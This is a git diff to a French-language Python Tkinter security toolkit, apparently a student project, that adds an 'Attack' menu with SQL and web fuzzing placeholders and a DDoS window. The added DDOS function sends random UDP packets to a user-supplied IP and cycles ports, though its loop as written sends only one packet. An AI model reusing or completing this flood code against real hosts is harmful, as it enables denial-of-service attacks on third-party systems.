@@ -9,24 +9,24 @@ Description :   Interface graphique regroupant :
 Auteurs :       Enzo PALASSIN :
                     - Integration GUI / Scanner / Crawler
                 Adrien P :
-                    - Documentation
+                    - Documentation globale
                 Guillaume DUJON :
                     - x
                 Julien DEGRAVE :
                     - Fuzzing SQL / DDOS
                 JEREMIE GUIBERT :
-                    - x         
+                    - Fuzzing WEB      
 """
 
 from tkinter import *
 from tkinter import ttk, messagebox
-import threading
-import os
 from urllib.parse import urljoin
-import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse
 from datetime import datetime
+import threading, requests, os, sys, socket, random
+import scapy.all as scapy
+
 
 #Main GUI
 root = Tk()
@@ -37,6 +37,9 @@ selected_profil = StringVar()
 CommandEntry = StringVar()
 Cible = StringVar()
 NMAP_Command = StringVar()
+
+KeepGoing = 1
+DDOStarget = StringVar()
 
 URLEntry = StringVar()
 pall = IntVar()
@@ -96,7 +99,7 @@ class Crawler():
         """
         if url not in self.urls_formulaire and url not in self.urls_protected and url not in self.urls_external_domain:
             formulaire = BeautifulSoup(page, "html.parser").find_all("form")
-            protected = BeautifulSoup(page, "html.parser").find_all("password")
+            #protected = BeautifulSoup(page, "html.parser").find_all("password")
             if formulaire:
                 #print("{} Une page avec un formulaire ! URL: {}".format(time, url))
                 self.urls_formulaire.append(url)
@@ -279,6 +282,7 @@ def NewCrawlWindow():
     CrawlWindowWidth = 800
     CrawlWindowHeight = 550
     CrawlWindow.geometry("%dx%d+%d+%d" % (CrawlWindowWidth, CrawlWindowHeight, x, y))
+    CrawlWindow.resizable(0, 0)
 
     lbl_urlcible = Label(CrawlWindow, text="URL Cible: ", font=("calibri", 12)).place(x=10, y=10)
     lbl_option = Label(CrawlWindow, text="Options: ", font=("calibri", 12)).place(x=10, y=45)
@@ -297,6 +301,49 @@ def NewCrawlWindow():
     CrawlerOutput.place(x=20, y=100)
 
 
+def NewDDOSWindows():
+    DDOSWindow = Toplevel(root)
+    DDOSWindow.title("DDOS/EF")
+    DDOSWindowWidth = 300
+    DDOSWindowHeight = 100
+    DDOSWindow.geometry("%dx%d+%d+%d" % (DDOSWindowWidth, DDOSWindowHeight, x, y))
+    DDOSWindow.resizable(0, 0)
+
+    lbl_cible = Label(DDOSWindow, text="Cible: ", font=("calibri", 12)).place(x=10, y=10)
+    entry_ddoscible = Entry(DDOSWindow, font=("calibri", 11), width=32, textvariable=DDOStarget).place(x=55, y=12)
+
+    die_button = Button(DDOSWindow, text = "omae wa mou shindeiru", font=("calibri", 10), command=(LaunchDDOS)).place(x=10,y=50)
+    stop_button = Button(DDOSWindow, text = "Stop", font=("calibri", 10), command=(StopDDOS)).place(x=250,y=50)
+
+def LaunchDDOS():
+    ddosth = threading.Thread(target=StartDDOS, args=("",))
+    ddosth.start()
+
+def StopDDOS():
+    global KeepGoing
+    KeepGoing = 0
+
+def StartDDOS(foo):
+    #global KeepGoing
+    #KeepGoing = 1
+    ddosth = threading.Thread(target=DDOS, args=("",))
+    ddosth.start()
+        
+
+def DDOS(foo):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    ip = DDOStarget.get()
+    port = 1
+    envoi = 0
+    sock.sendto(bytes, (ip, port))
+    envoi = envoi + 1
+    while KeepGoing == 1:
+        print("DDOS en cours")
+        port = port + 1
+        if port == 65535:
+            port = 1
+    print("exiting DDOS")
 
 
 #Taille de la fenêtre Root
@@ -341,6 +388,14 @@ root.config(menu=menubar)
 menucrawl = Menu(menubar, tearoff=0)
 menubar.add_cascade(label="Scan Web", menu=menucrawl)
 menucrawl.add_command(label="Crawler HTTP(s)", command=NewCrawlWindow)
+
+menufuzz = Menu(menubar, tearoff=0)
+menubar.add_cascade(label="Attack", menu=menufuzz)
+menufuzz.add_command(label="Fuzzing SQL")
+menufuzz.add_command(label="Fuzzing WEB")
+menufuzz.add_separator()
+menufuzz.add_command(label="DDOS", command=NewDDOSWindows)
+
 
 #Affichage GUI
 root.mainloop()
